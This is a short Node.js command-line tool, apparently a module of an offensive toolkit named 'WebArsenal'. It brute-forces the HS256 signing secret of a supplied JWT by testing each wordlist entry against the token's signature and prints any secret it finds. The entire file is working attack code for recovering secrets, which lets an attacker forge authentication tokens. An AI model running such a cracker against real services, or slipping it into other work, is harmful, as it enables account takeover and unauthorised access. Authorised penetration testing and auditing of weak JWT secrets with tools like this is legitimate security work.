#!/usr/bin/env node
/**
 * ╔═════════════════════════════════════════════════════════════════╗
 * ║  WebArsenal: jwt-brute-forcer.js                                 ║
 * ║  Category: auth-helpers                                         ║
 * ╚═════════════════════════════════════════════════════════════════╝
 */

'use strict';

const { program } = require('commander');
const chalk = require('chalk');
const crypto = require('crypto');

program
  .name('jwt-brute-forcer.js')
  .description('Brute-forces HS256 JWT secrets using a wordlist.')
  .version('3.0.0')
  .requiredOption('-t, --token <jwt>', 'JWT to crack')
  .requiredOption('-w, --wordlist <file>', 'Wordlist of potential secrets')
  .parse(process.argv);

const opts = program.opts();

function base64UrlEncode(str) {
  return Buffer.from(str).toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function verifyHS256(header, payload, signature, secret) {
  const data = `${header}.${payload}`;
  const genSig = crypto.createHmac('sha256', secret).update(data).digest('base64url');
  return genSig === signature;
}

async function run() {
  console.log(chalk.bold.magenta('\n╔════════════════════════════════════════════╗'));
  console.log(chalk.bold.magenta(  '║  WebArsenal Module: ' + 'jwt-brute-forcer.js'.padEnd(23) + '║'));
  console.log(chalk.bold.magenta(  '╚════════════════════════════════════════════╝\n'));
  
  const segments = opts.token.split('.');
  if (segments.length !== 3) {
    console.log(chalk.red('[x] Invalid JWT format. Expected header.payload.signature'));
    return;
  }
  
  const [header, payload, signature] = segments;
  const fs = require('fs');
  if (!fs.existsSync(opts.wordlist)) {
    console.log(chalk.red(`[x] Wordlist not found: ${opts.wordlist}`));
    return;
  }
  
  const secrets = fs.readFileSync(opts.wordlist, 'utf8').split('\n').filter(Boolean).map(s => s.trim());
  console.log(chalk.cyan(`[*] Brute-forcing with ${secrets.length} secrets...\n`));
  
  for (const secret of secrets) {
    if (verifyHS256(header, payload, signature, secret)) {
      console.log(chalk.bold.green(`\n[✓] SUCCESS: Secret found: ${secret}`));
      return;
    }
    process.stdout.write(chalk.gray('.'));
  }
  
  console.log(chalk.red('\n\n[x] Failed to crack the token. Try a larger wordlist.'));
}

if (require.main === module) { run().catch(console.error); }
module.exports = { run };
